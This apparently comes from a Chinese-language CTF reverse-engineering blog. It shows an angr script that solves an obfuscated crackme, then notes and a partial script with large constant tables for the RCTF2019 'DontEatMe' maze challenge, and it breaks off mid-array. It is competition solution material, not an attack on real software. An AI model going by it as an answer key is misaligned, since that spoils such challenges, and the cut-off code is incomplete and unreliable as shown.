<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = Project(<span class="string">&#x27;./EzObfuse_Chapter2.exe&#x27;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state = p.factory.blank_state(addr=<span class="number">0x4164f8</span>)</span><br><span class="line">simfd = state.posix.get_fd(<span class="number">0</span>)</span><br><span class="line">data,real_size = simfd.read_data(<span class="number">22</span>)</span><br><span class="line">state.memory.store(<span class="number">0x42612c</span>,data)</span><br><span class="line">state.memory.store(<span class="number">0x426020</span>,data)</span><br><span class="line">simgr = p.factory.simulation_manager(state)</span><br><span class="line">simgr.one_active.options.add(options.LAZY_SOLVES)</span><br><span class="line">simgr.explore(find=<span class="number">0x416609</span>,avoid=<span class="number">0x4165ea</span>)</span><br><span class="line"></span><br><span class="line">print(simgr.one_found.solver.eval(simgr.one_found.memory.load(<span class="number">0x0042612C</span>,<span class="number">22</span>),cast_to = bytes))</span><br></pre></td></tr></table></figure>

<p>这道题也可以用qiling框架做，debug也可以，改天再试试</p>
<h2 id="rev-RCTF2019-DontEatMe"><a href="#rev-RCTF2019-DontEatMe" class="headerlink" title="[rev][RCTF2019]DontEatMe"></a>[rev][RCTF2019]DontEatMe</h2><p>迷宫问题</p>
<ol>
<li>使用固定种子随机生成迷宫</li>
<li>对用户输入做一些变换，作为步输入进迷宫</li>
<li>通过debug打印迷宫</li>
<li>起点为5,10</li>
<li>最终需要所处的点为0最终位于9,4，总步数不超过17，大概就是中间那条线</li>
</ol>
<p>对于输入的变换</p>
<ol>
<li>base16解码</li>
<li>对于每解码后的每8个Byte，分成两组4Byte，每个byte16轮变换，中间两个常量通过debug得到</li>
<li>调试器可以更改数据显示类型以更好地复制</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print maze</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">16</span>):</span><br><span class="line">    print(a[i:i+<span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">0xc12083c0</span></span><br><span class="line">c2 = <span class="number">0x6809dce2</span></span><br><span class="line">c3 = [<span class="number">0xCDC56A63</span>,<span class="number">0x4EC090F1</span>,<span class="number">0x21EDD1DA</span>,<span class="number">0xC270CEF2</span>,<span class="number">0x2FED34D7</span>,<span class="number">0x83DF5638</span>,<span class="number">0xD5C182D5</span>,<span class="number">0xBF870104</span>,<span class="number">0x99CC5FB9</span>,<span class="number">0xEDA87ED6</span>,<span class="number">0x3250667D</span>,<span class="number">0x4D98EE5D</span>,<span class="number">0x1F2F3443</span>,<span class="number">0x4BCDEF38</span>,<span class="number">0x0FA6E01C</span>,<span class="number">0xDDDDA728</span>]</span><br><span class="line"></span><br><span class="line">v53 = [<span class="number">0x459FC5A5</span>,<span class="number">0x7FC789F4</span>,<span class="number">0xFBB675AB</span>,<span class="number">0x65917E7D</span>,<span class="number">0xF90902DF</span>,<span class="number">0xAF945AF7</span>,<span class="number">0xA87034DA</span>,<span class="number">0x3AABD494</span>,<span class="number">0x504E015E</span>,<span class="number">0xC96E5B77</span>,<span class="number">0xAFD7CF57</span>,<span class="number">0x2A1948B5</span>,<span class="number">0x7BF2E1AF</span>,<span class="number">0xE89075ED</span>,<span class="number">0x5C0DB5C6</span>,<span class="number">0x6C90C3F3</span>,<span class="number">0x397E24DD</span>,<span class="number">0x262E0C48</span>,<span class="number">0xEBD8BF12</span>,<span class="number">0xA439AC9E</span>,<span class="number">0x791C72BB</span>,<span class="number">0xB7076160</span>,<span class="number">0xAA545E52</span>,<span class="number">0x7D55F11C</span>,<span class="number">0xE9ADA6B6</span>,<span class="number">0x32EAD595</span>,<span class="number">0xC94C2B14</span>,<span class="number">0x2E0BBD9F</span>,<span class="number">0x9AA1A601</span>,<span class="number">0xD02F0B5D</span>,<span class="number">0xD0699D06</span>,<span class="number">0x16A4F9CC</span>,<span class="number">0x2AAA9A3B</span>,<span class="number">0x3507293E</span>,<span class="number">0x82F618CE</span>,<span class="number">0xD8303DDA</span>,<span class="number">0x5E0CB782</span>,<span class="number">0x1AC22EEF</span>,<span class="number">0x5E7FF8F4</span>,<span class="number">0x26CEFC03</span>,<span class="number">0xCDDFBBA8</span>,<span class="number">0x55D80628</span>,<span class="number">0xD5EC1A46</span>,<span class="number">0x1E00E511</span>,<span class="number">0x9B46FC6E</span>,<span class="number">0x2DB1E6E0</span>,<span class="number">0xCBDF9395</span>,<span class="number">0xE00B33D9</span>,<span class="number">0x5A43D50F</span>,<span class="number">0x447DE041</span>,<span class="number">0xC58E5C38</span>,<span class="number">0x1763413E</span>,<span class="number">0x7FE9B647</span>,<span class="number">0xC37B0FB2</span>,<span class="number">0x27A2B087</span>,<span class="number">0x8037A85E</span>,<span class="number">0xF47FEA64</span>,<span class="number">0x592A892F</span>,<span class="number">0xECAD7E7F</span>,<span class="number">0x886AD0FB</span>,<span class="number">0x17B545E7</span>,<span class="number">0xBFB8CD9D</span>,<span class="number">0x5206FAEC</span>,<span class="number">0x205AC34F</span>,<span class="number">0xB9112B48</span>,<span class="number">0x8F64D407</span>,<span class="number">0xA76EBC2F</span>,<span class="number">0x238C306D</span>,<span class="number">0x56D18B07</span>,<span class="number">0xE442447F</span>,<span class="number">0xC0AEB75F</span>,<span class="number">0x8D7ADFDA</span>,<span class="number">0x39872D01</span>,<span class="number">0x07247AE8</span>,<span class="number">0x59DBD0F4</span>,<span class="number">0x985B4AF0</span>,<span class="number">0x09EA38B5</span>,<span class="number">0x9C104491</span>,<span class="number">0x3B135C6D</span>,<span class="number">0xC69E7858</span>,<span class="number">0xE65022F0</span>,<span class="number">0xD9943FF4</span>,<span class="number">0xAABEDF0A</span>,<span class="number">0xB66814B1</span>,<span class="number">0x1F927210</span>,<span class="number">0x9961DD03</span>,<span class="number">0x4BCDC827</span>,<span class="number">0xBB14DD9F</span>,<span class="number">0x40FE24C3</span>,<span class="number">0x5B7FE695</span>,<span class="number">0xB332F95C</span>,<span class="number">0x065262E3</span>,<span class="number">0x2926942D</span>,<span class="number">0x9E53F796</span>,<span class="number">0x7DBFAA45</span>,<span class="number">0x355B70ED</span>,<span class="number">0x672DFA65</span>,<span class="number">0xC5D715B0</span>,<span class="number">0xD885410D</span>,<span class="number">0x5DEA7836</span>,<span class="number">0xD5EA8A92</span>,<span class="number">0xF14E1A6A</span>,<span class="number">0xA02AB37D</span>,<span class="number">0xF5EC3E46</span>,<span class="number">0x9B2D3B45</span>,<span class="number">0xA45D8759</span>,<span class="number">0x5656AC15</span>,<span class="number">0x45001507</span>,<span class="number">0xD0CA4495</span>,<span class="number">0x5C9B0A9A</span>,<span class="number">0xBA41CC1A</span>,<span class="number">0x5B6B7192</span>,<span class="number">0x5B5B0296</span>,<span class="number">0xEB62D7F8</span>,<span class="number">0x63E052B8</span>,<span class="number">0x5E7F661A</span>,<span class="number">0x15F54EB2</span>,<span class="number">0x32BC0DC1</span>,<span class="number">0x757F8AC1</span>,<span class="number">0x4000E44A</span>,<span class="number">0x4C7C3F6D</span>,<span class="number">0x035152D7</span>,<span class="number">0xB215A2FA</span>,<span class="number">0xECF8F423</span>,<span class="number">0x368A6EFB</span>,<span class="number">0xB705DD1F</span>,<span class="number">0xB0EA07D4</span>,<span class="number">0xB6DC6BC9</span>,<span class="number">0x37F9F551</span>,<span class="number">0xF9B6703A</span>,<span class="number">0x7C12AA99</span>,<span class="number">0xA82E5C89</span>,<span class="number">0xC4ABD951</span>,<span class="number">0x0BB24942</span>,<span class="number">0x5106CDF4</span>,<span class="number">0xD20ACB1F</span>,<span class="number">0x0B06A021</span>,<span class="number">0xF5721C2C</span>,<span class="number">0xDC6D6A4D</span>,<span class="number">0xB416E5DB</span>,<span class="number">0x051A2E03</span>,<span class="number">0xE619C398</span>,<span class="number">0x59E2A278</span>,<span class="number">0x75AE0501</span>,<span class="number">0x33DF6E1D</span>,<span class="number">0x7F5F8F1D</span>,<span class="number">0xD3B09DFA</span>,<span class="number">0x5CCEF854</span>,<span class="number">0x353A9751</span>,<span class="number">0x28CDF4C3</span>,<span class="number">0xFA84DF8A</span>,<span class="number">0xB77937F6</span>,<span class="number">0x89DEF60E</span>,<span class="number">0xEF104A33</span>,<span class="number">0x73A9B332</span>,<span class="number">0xA2B958D4</span>,<span class="number">0xB7F11FAE</span>,<span class="number">0xAB10382B</span>,<span class="number">0x610507CB</span>,<span class="number">0xC2494EB2</span>,<span class="number">0x38B0E08C</span>,<span class="number">0xB45BE251</span>,<span class="number">0xB6C9324D</span>,<span class="number">0x50A16213</span>,<span class="number">0xE10FA30C</span>,<span class="number">0xE08F5DA5</span>,<span class="number">0x222F5327</span>,<span class="number">0xF3B44C04</span>,<span class="number">0x01822F6D</span>,<span class="number">0xEC8D1AFB</span>,<span class="number">0x0E77C8F3</span>,<span class="number">0xB94AD1F2</span>,<span class="number">0x7EC184CB</span>,<span class="number">0x8F24309C</span>,<span class="number">0x6BCEE4CF</span>,<span class="number">0xD73B45D7</span>,<span class="number">0x497F0CCD</span>,<span class="number">0x31A6DC74</span>,<span class="number">0x33769D5B</span>,<span class="number">0xD0FAAD9C</span>,<span class="number">0x93247C0E</span>,<span class="number">0xEF989638</span>,<span class="number">0x639429F7</span>,<span class="number">0x347B185A</span>,<span class="number">0xAB662E53</span>,<span class="number">0xADB55832</span>,<span class="number">0x460EAECB</span>,<span class="number">0x4CFF4967</span>,<span class="number">0x32983144</span>,<span class="number">0xBE7C9F6A</span>,<span class="number">0x6572690F</span>,<span class="number">0xB6A44EC6</span>,<span class="number">0x296B626B</span>,<span class="number">0x6F84AC06</span>,<span class="number">0xA4109176</span>,<span class="number">0x09696DA0</span>,<span class="number">0xCF01E53A</span>,<span class="number">0xA2C947B3</span>,<span class="number">0x05018011</span>,<span class="number">0x3C422118</span>,<span class="number">0xC0B3B8FC</span>,<span class="number">0x974DB30E</span>,<span class="number">0x6CAFF180</span>,<span class="number">0x5ED053FF</span>,<span class="number">0x7586923B</span>,<span class="number">0xD18AD289</span>,<span class="number">0x6ADDD492</span>,<span class="number">0x181D1549</span>,<span class="number">0x8565132A</span>,<span class="number">0x11B56CC7</span>,<span class="number">0xFE064E6F</span>,<span class="number">0xED2CEFC0</span>,<span class="number">0x8861E9CF</span>,<span class="number">0x35DE598F</span>,<span class="number">0x1852B4BC</span>,<span class="number">0x5E58E9F7</span>,<span class="number">0xC1EBF4F6</span>,<span class="number">0x006A1A68</span>,<span class="number">0xD6970D50</span>,<span class="number">0x94153D1C</span>,<span class="number">0xC3913B30</span>,<span class="number">0x81CCDFDF</span>,<span class="number">0x4BDA28AF</span>,<span class="number">0xE47E5EF7</span>,<span class="number">0x9EBC1A89</span>,<span class="number">0x3FFD9A1B</span>,<span class="number">0xE6E81C84</span>,<span class="number">0x579CBD80</span>,<span class="number">0x540CDE20</span>,<span class="number">0x3D03D046</span>,<span class="number">0xB30BD041</span>,<span class="number">0x1B47C861</span>,<span class="number">0xB12E9CFB</span>,<span class="number">0xEB89F014</span>,<span class="number">0xD9370AE3</span>,<span class="number">0x80087376</span>,<span class="number">0x65D3550C</span>,<span class="number">0x6E4CDBB7</span>,<span class="number">0x235D3750</span>,<span class="number">0x99B3B43E</span>,<span class="number">0x38FFABD3</span>,<span class="number">0x75C8BC8A</span>,<span class="number">0xFEFA00F1</span>,<span class="number">0xDD8F7F38</span>,<span class="number">0x42DBF66F</span>,<span class="number">0x606BC6B0</span>,<span class="number">0xD00CA499</span>,<span class="number">0xF6BC1178</span>,<span class="number">0x85C2C6BD</span>,<span class="number">0x2DF5F445</span>,<span class="number">0x6BB5EB11</span>,<span class="number">0x8027805B</span>,<span class="number">0xFE6ABACD</span>,<span class="number">0xA782A5C7</span>,<span class="number">0xA5F5B40A</span>,<span class="number">0xAC3F2CA5</span>]</span><br><span class="line">v54 = [<span class="number">0x3B928883</span>,<span class="number">0xA954448B</span>,<span class="number">0xFD81975A</span>,<span class="number">0x59BE145A</span>,<span class="number">0xCE903CCA</span>,<span class="number">0x636CE1F9</span>,<span class="number">0xF1B92DCC</span>,<span class="number">0x2B255DFA</span>,<span class="number">0xF24D3C82</span>,<span class="number">0x391B2517</span>,<span class="number">0x03D670DB</span>,<span class="number">0x5D630DD8</span>,<span class="number">0x50D515CB</span>,<span class="number">0xD21AF9C3</span>,<span class="number">0xC92B08CD</span>,<span class="number">0x9157B9AC</span>,<span class="number">0xB51E501C</span>,<span class="number">0x362812DC</span>,<span class="number">0xBE36DBCB</span>,<span class="number">0x6CB41118</span>,<span class="number">0x61CA6755</span>,<span class="number">0xE477CA36</span>,<span class="number">0xB3DDA664</span>,<span class="number">0x06665D16</span>,<span class="number">0x5B83FA2C</span>,<span class="number">0xF4797850</span>,<span class="number">0x10D61B1C</span>,<span class="number">0xD82BC254</span>,<span class="number">0x17D8A560</span>,<span class="number">0xC281F6A5</span>,<span class="number">0xEC3AE828</span>,<span class="number">0x2905C224</span>,<span class="number">0xD4FE451A</span>,<span class="number">0x43744CEB</span>,<span class="number">0x5E474E9C</span>,<span class="number">0x749BFACD</span>,<span class="number">0xD054E526</span>,<span class="number">0x162C850D</span>,<span class="number">0x72A714E9</span>,<span class="number">0xFE46AC10</span>,<span class="number">0x3487BC05</span>,<span class="number">0x2C8AEA43</span>,<span class="number">0x9E3F2FF8</span>,<span class="number">0x2F0E5C23</span>,<span class="number">0xD3E784C8</span>,<span class="number">0x8E20D985</span>,<span class="number">0x3DA8DF49</span>,<span class="number">0x63AD4B53</span>,<span class="number">0x7C9B3978</span>,<span class="number">0x4FED2F4E</span>,<span class="number">0x252C0D9C</span>,<span class="number">0x5AC1BCBB</span>,<span class="number">0xB4273B2F</span>,<span class="number">0x06F2009C</span>,<span class="number">0x5A5DD8F1</span>,<span class="number">0x59F768E0</span>,<span class="number">0xAC518815</span>,<span class="number">0x2B8F713F</span>,<span class="number">0x2AFD2285</span>,<span class="number">0x0A88492D</span>,<span class="number">0x703974BB</span>,<span class="number">0xE61EBE48</span>,<span class="number">0xEBD57CD3</span>,<span class="number">0xF03CB920</span>,<span class="number">0xB014F855</span>,<span class="number">0x40BB0D0C</span>,<span class="number">0xFABEFE58</span>,<span class="number">0x28E5D18C</span>,<span class="number">0x08CF8517</span>,<span class="number">0x203372AE</span>,<span class="number">0xDF4C9D0C</span>,<span class="number">0x8C387224</span>,<span class="number">0x9213FA25</span>,<span class="number">0x1BE46332</span>,<span class="number">0xE9E8FA1F</span>,<span class="number">0xC5130557</span>,<span class="number">0xFD632B81</span>,<span class="number">0xD7137EAF</span>,<span class="number">0xD1751BF9</span>,<span class="number">0x1ECDB40D</span>,<span class="number">0x04D3ACC6</span>,<span class="number">0x3B3C44CC</span>,<span class="number">0x126F70C6</span>,<span class="number">0xAE14D8DE</span>,<span class="number">0x09249A6B</span>,<span class="number">0x8E602082</span>,<span class="number">0x94EBCD7B</span>,<span class="number">0x93EA6071</span>,<span class="number">0x87CB1D04</span>,<span class="number">0xE48BC7BD</span>,<span class="number">0x6E86AB4B</span>,<span class="number">0x736314FE</span>,<span class="number">0x4F0D819A</span>,<span class="number">0x6A4FA2DE</span>,<span class="number">0xF2284933</span>,<span class="number">0x2FD58EF7</span>,<span class="number">0x1E19833E</span>,<span class="number">0x48AA62F7</span>,<span class="number">0x4A9D931D</span>,<span class="number">0x82BAEBBD</span>,<span class="number">0x22BC1AEE</span>,<span class="number">0xE02E5E94</span>,<span class="number">0x76E42B6E</span>,<span class="number">0x21169B3B</span>,<span class="number">0x78410E1C</span>,<span class="number">0x366D3DBB</span>,<span class="number">0xF7B7AC7B</span>,<span class="number">0x5C12F29C</span>,<span class="number">0x4E271BE5</span>,<span class="number">0x4BAA9AB7</span>,<span class="number">0x2724BF08</span>,<span class="number">0x492AC28F</span>,<span class="number">0x06AD0F63</span>,<span class="number">0xED6B287D</span>,<span class="number">0xEDBCBA48</span>,<span class="number">0x3384877C</span>,<span class="number">0xECBBC030</span>,<span class="number">0xB82E3B2A</span>,<span class="number">0x92160A7C</span>,<span class="number">0xF23874C3</span>,<span class="number">0x75E84887</span>,<span class="number">0x6A2107D4</span>,<span class="number">0xAB01A6E8</span>,<span class="number">0x7232BDA4</span>,<span class="number">0x219FAD2D</span>,<span class="number">0xE016178A</span>,<span class="number">0x61F22009</span>,<span class="number">0x5850B00D</span>,<span class="number">0xC69FEF72</span>,<span class="number">0x79908C67</span>,<span class="number">0x17A0173B</span>,<span class="number">0xC2F925AC</span>,<span class="number">0x560B1C81</span>,<span class="number">0xADF339C4</span>,<span class="number">0x38E19FB8</span>,<span class="number">0xE41D5795</span>,<span class="number">0xCE3A4B81</span>,<span class="number">0x7F152D4B</span>,<span class="number">0x4B238BFC</span>,<span class="number">0x04FC5592</span>,<span class="number">0x5465AC3B</span>,<span class="number">0x3845BF97</span>,<span class="number">0xA658D9F2</span>,<span class="number">0x47E82467</span>,<span class="number">0x986593C9</span>,<span class="number">0x1191C0CB</span>,<span class="number">0x147CC08C</span>,<span class="number">0x496336AE</span>,<span class="number">0xEAE5DA8A</span>,<span class="number">0x7DA03065</span>,<span class="number">0x00B7411D</span>,<span class="number">0x22AB8BD5</span>,<span class="number">0x3CAA62BF</span>,<span class="number">0xB0581433</span>,<span class="number">0x73DD39FB</span>,<span class="number">0x5E9EE883</span>,<span class="number">0xB91A3D18</span>,<span class="number">0xA52B2D1A</span>,<span class="number">0x05834365</span>,<span class="number">0x1F9ED6B2</span>,<span class="number">0xAD3B591B</span>,<span class="number">0x9BDBF823</span>,<span class="number">0x6807BE03</span>,<span class="number">0x0414F751</span>,<span class="number">0xFF70EC21</span>,<span class="number">0xFEB07CBA</span>,<span class="number">0x047690BE</span>,<span class="number">0x603E8BF3</span>,<span class="number">0x16D2BC40</span>,<span class="number">0x572216EF</span>,<span class="number">0x63FF8C4C</span>,<span class="number">0x77991CCE</span>,<span class="number">0x36B2400D</span>,<span class="number">0x9977BDAF</span>,<span class="number">0x04C9621F</span>,<span class="number">0xC37DC00B</span>,<span class="number">0x9CC85CB2</span>,<span class="number">0xC5E01FDE</span>,<span class="number">0x2D75607D</span>,<span class="number">0xA0F556DB</span>,<span class="number">0xC97F64E4</span>,<span class="number">0xB579B604</span>,<span class="number">0x91C35F26</span>,<span class="number">0x21AF8C37</span>,<span class="number">0xB743C7FD</span>,<span class="number">0x12FB7F18</span>,<span class="number">0x885237F5</span>,<span class="number">0x1BBFCC6B</span>,<span class="number">0x5C1FE441</span>,<span class="number">0xBFEF973A</span>,<span class="number">0xEC4676C5</span>,<span class="number">0x4A47CC65</span>,<span class="number">0x971EC8EE</span>,<span class="number">0x3B1DB437</span>,<span class="number">0x5CC8BFB3</span>,<span class="number">0xB6FA47C5</span>,<span class="number">0xF8E4C599</span>,<span class="number">0x475D776B</span>,<span class="number">0xF1CB0976</span>,<span class="number">0xA3C7A932</span>,<span class="number">0xC79A3984</span>,<span class="number">0x084FD354</span>,<span class="number">0xDAE6388B</span>,<span class="number">0x91A70338</span>,<span class="number">0x87CA30E9</span>,<span class="number">0x5DABEF28</span>,<span class="number">0x1EE48985</span>,<span class="number">0xBD7FAEFF</span>,<span class="number">0x44013C1F</span>,<span class="number">0x570FEED8</span>,<span class="number">0x7CB22CD1</span>,<span class="number">0x08311758</span>,<span class="number">0x5AB5DCEB</span>,<span class="number">0xFD96B8B8</span>,<span class="number">0xA80CE023</span>,<span class="number">0x30BBB19D</span>,<span class="number">0x3B33E05A</span>,<span class="number">0xC7649D1E</span>,<span class="number">0x4044428F</span>,<span class="number">0xFE0630C9</span>,<span class="number">0xF656070D</span>,<span class="number">0x303A0A5D</span>,<span class="number">0x16A668B3</span>,<span class="number">0xABB0B40E</span>,<span class="number">0x4ABC9220</span>,<span class="number">0x6038B47F</span>,<span class="number">0x71CF3E0A</span>,<span class="number">0xFC69DAA6</span>,<span class="number">0xFCA9C550</span>,<span class="number">0x17427DEA</span>,<span class="number">0x4DCE3693</span>,<span class="number">0x2361B041</span>,<span class="number">0xD0CCCD10</span>,<span class="number">0x2F270DAF</span>,<span class="number">0x348FA060</span>,<span class="number">0x1177CE40</span>,<span class="number">0x706666B6</span>,<span class="number">0xC329DAF7</span>,<span class="number">0xE3CCA015</span>,<span class="number">0xD6D9596F</span>,<span class="number">0xB2C18EDD</span>,<span class="number">0x25CBE2D3</span>,<span class="number">0xC1A6E67D</span>,<span class="number">0xD9935CF7</span>,<span class="number">0xE3D91858</span>,<span class="number">0xFF9ADE8D</span>,<span class="number">0x4EF7FFD9</span>,<span class="number">0xAABA3CA9</span>,<span class="number">0x8A831B4D</span>,<span class="number">0x1FF14B96</span>,<span class="number">0x9868C966</span>,<span class="number">0x938E9D32</span>,<span class="number">0x4216BFC4</span>,<span class="number">0x7119F0E1</span>,<span class="number">0x592E37B8</span>,<span class="number">0x4BD7DF7C</span>]</span><br><span class="line">v55 = [<span class="number">0x5E476C95</span>,<span class="number">0x03168871</span>,<span class="number">0xEBD956D8</span>,<span class="number">0xFADE7AC3</span>,<span class="number">0xE562A819</span>,<span class="number">0xE68BB4B7</span>,<span class="number">0x0129E1D0</span>,<span class="number">0xBEFBAC4D</span>,<span class="number">0x0C5997B2</span>,<span class="number">0x50EF791A</span>,<span class="number">0x00AD7115</span>,<span class="number">0xC03CF6DD</span>,<span class="number">0xF88F22DD</span>,<span class="number">0x395AF289</span>,<span class="number">0x2D086919</span>,<span class="number">0x64B9435C</span>,<span class="number">0x3D4E53BF</span>,<span class="number">0x26ED3F3A</span>,<span class="number">0x73CD31A6</span>,<span class="number">0x632BCAA9</span>,<span class="number">0x8D9D5141</span>,<span class="number">0xBC20D5E8</span>,<span class="number">0x7CA24F43</span>,<span class="number">0x0EAE0EAB</span>,<span class="number">0xA1D25EBE</span>,<span 